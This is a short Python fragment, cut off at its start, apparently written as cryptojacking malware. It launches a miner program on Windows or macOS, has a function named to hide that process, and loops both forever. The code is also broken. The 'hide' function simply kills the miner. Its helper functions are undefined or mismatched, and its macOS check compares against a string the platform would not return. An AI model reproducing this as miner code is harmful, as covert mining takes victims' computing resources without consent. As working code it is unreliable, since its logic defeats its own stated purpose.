    os_type = check_for_windows()
    if os_type == "win32":
        return "Windows"
    elif os_type == "macOS":
        return "MacOS"

def start_mining():
    os_type = get_os_type()
    if os_type == "Windows":
        subprocess.run(["start", "miner.exe"], shell=True)
    elif os_type == "MacOS":
        subprocess.run(["open", "/Applications/Miner.app"])

def hide_process():
    os_type = get_os_type()
    if os_type == "Windows":
        subprocess.run(["taskkill", "/f", "/im", "miner.exe"], shell=True)
    elif os_type == "MacOS":
        subprocess.run(["killall", "miner"], shell=True)

def main():
    while True:
        start_mining()
        hide_process()

if __name__ == "__main__":
    main()

